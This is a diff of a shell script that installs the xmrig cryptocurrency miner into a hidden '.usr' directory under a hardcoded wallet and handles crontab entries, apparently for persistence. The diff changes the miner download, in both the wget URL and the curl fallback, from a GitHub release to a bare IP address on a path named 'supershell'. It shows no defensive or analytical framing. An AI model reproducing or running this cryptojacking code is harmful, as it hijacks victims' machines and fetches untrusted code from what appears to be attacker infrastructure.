@@ -11,7 +11,7 @@ killall xmrig
 p=$(pwd)
 ROOT_path="$p/.usr"
 wallet="Chronosops@proton.me"
-xmrig_url="https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-21-2/xmrig-6.21.2-linux-static-x64.tar.gz"
+xmrig_url="http://119.45.219.31:8888/supershell/server/files/download/xmrig.tar.gz"
 random_number=$(shuf -i 10000000-99999999 -n 1)
 command=""
 existing_crontab=$(crontab -l 2>/dev/null)
@@ -52,7 +52,7 @@ if [ -f "xmrig.tar.gz" ];then
     echo "Wget xmrig downloaded successfully"
 else
     echo "Wget xmrig download failed"
-    curl -L https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-21-2/xmrig-6.21.2-linux-static-x64.tar.gz -o xmrig.tar.gz
+    curl -L http://119.45.219.31:8888/supershell/server/files/download/xmrig.tar.gz -o xmrig.tar.gz
     if [ -f "xmrig.tar.gz" ];then
         echo "curl xmrig downloaded successfully"
     else
